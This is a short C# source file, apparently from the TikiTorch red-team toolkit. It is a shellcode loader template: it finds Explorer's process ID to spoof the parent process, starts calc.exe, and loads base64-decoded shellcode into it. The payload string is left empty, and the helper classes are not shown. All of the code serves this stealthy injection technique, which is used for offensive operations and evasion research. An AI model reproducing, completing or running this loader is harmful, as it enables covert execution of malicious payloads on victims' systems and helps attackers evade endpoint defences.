using System;

namespace TikiTorch
{
    public class TikiScript
    {

        public TikiScript()
        {
            Flame();
        }

        public static void Flame()
        {
            string targetProcess = @"C:\\Windows\\System32\\calc.exe";
            string encodedShellcode = @"";
            int parentProcessId = PPID.FindExplorer();

            if (parentProcessId == 0)
            {
                Console.WriteLine("[x] Couldn't get Explorer PID");
                Environment.Exit(1);
            }

            var ldr = new Loader();

            try
            {
                ldr.Load(targetProcess, Convert.FromBase64String(encodedShellcode), parentProcessId);
            }
            catch (Exception e)
            {
                Console.WriteLine("[x] Something went wrong!!" + e.Message);
            }
        }
    }
}
